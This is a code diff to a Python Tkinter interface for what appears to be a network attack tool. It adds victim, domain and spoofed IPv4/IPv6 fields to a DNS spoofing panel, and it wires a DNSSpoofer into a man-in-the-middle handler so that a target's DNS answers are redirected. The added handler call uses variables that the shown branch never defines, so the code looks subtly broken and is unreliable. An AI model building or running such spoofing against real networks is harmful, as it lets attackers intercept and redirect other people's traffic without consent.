@@ -52,13 +52,22 @@ class AttackGUI:
         # DNS options
         self.dns_frame = tk.Frame(root)
 
-        tk.Label(self.dns_frame, text="Domain to Spoof:").grid(row=0, column=0, sticky="e", padx=5, pady=3)
-        self.dns_domain_entry = tk.Entry(self.dns_frame, width=23)
-        self.dns_domain_entry.grid(row=0, column=1, padx=5, pady=3)
+        tk.Label(self.dns_frame, text="Victim IP:").grid(row=0, column=0, sticky="e", padx=5, pady=3)
+        self.dns_victim_entry = tk.Entry(self.dns_frame, width=23)
+        self.dns_victim_entry.grid(row=0, column=1, padx=5, pady=3)
 
-        tk.Label(self.dns_frame, text="Spoof By IP:").grid(row=1, column=0, sticky="e", padx=5, pady=3)
+        tk.Label(self.dns_frame, text="Domain to Spoof:").grid(row=1, column=0, sticky="e", padx=5, pady=3)
+        self.dns_domain_entry = tk.Entry(self.dns_frame, width=23)
+        self.dns_domain_entry.grid(row=1, column=1, padx=5, pady=3)
+
+        tk.Label(self.dns_frame, text="Spoof IPv4:").grid(row=2, column=0, sticky="e", padx=5, pady=3)
         self.dns_spoof_ip_entry = tk.Entry(self.dns_frame, width=23)
-        self.dns_spoof_ip_entry.grid(row=1, column=1, padx=5, pady=3)
+        self.dns_spoof_ip_entry.grid(row=2, column=1, padx=5, pady=3)
+
+        tk.Label(self.dns_frame, text="Spoof IPv6 (optional):").grid(row=3, column=0, sticky="e", padx=5, pady=3)
+        self.dns_spoof_ipv6_entry = tk.Entry(self.dns_frame, width=23)
+        self.dns_spoof_ipv6_entry.grid(row=3, column=1, padx=5, pady=3)
+
 
         # MITM options
         self.mitm_frame = tk.Frame(root)
@@ -163,14 +172,36 @@ class AttackGUI:
 
             # DNS SPOOFING
             elif attack == "DNS Spoofing":
-                domain = self.dns_domain_entry.get().strip()
+                victim_ip = self.dns_victim_entry.get().strip()
+                domain = self.dns_domain_entry.get().strip().lower()
                 spoof_ip = self.dns_spoof_ip_entry.get().strip()
+                spoof_ipv6 = self.dns_spoof_ipv6_entry.get().strip() or None
+
+                if not victim_ip or not domain or not spoof_ip:
+                    self.log("DNS spoofing error: missing required fields")
+                    return
+
+                dns_map = {domain: spoof_ip}
 
                 self.log("Starting DNS spoofing:")
-                self.log(f"  Domain:   {domain}")
-                self.log(f"  Spoof IP: {spoof_ip}")
+                self.log(f"  Victim IP: {victim_ip}")
+                self.log(f"  Domain:    {domain}")
+                self.log(f"  IPv4:      {spoof_ip}")
+                self.log(f"  IPv6:      {spoof_ipv6 or 'disabled'}")
 
-                Dns_spoofing.dns_spoofing(domain, spoof_ip)
+                spoofer = Dns_spoofing.DNSSpoofer(
+                    interface=sc.conf.iface,
+                    victim_ip=victim_ip,
+                    dns_mapping=dns_map,
+                    attacker_ip=spoof_ip,
+                    attacker_ipv6=spoof_ipv6,
+                    logger=self.log
+                )
+                
+                mitm_handler = MitmHandler(sc.conf.iface, server_ip, victim, spoof_mac, spoof_ip, spoof_ip_v6, self.log)
+                mitm_handler.add_filter(spoofer._dns_filter)
+                mitm_handler.start()
+                spoofer.start()
 
             # MITM
             else:
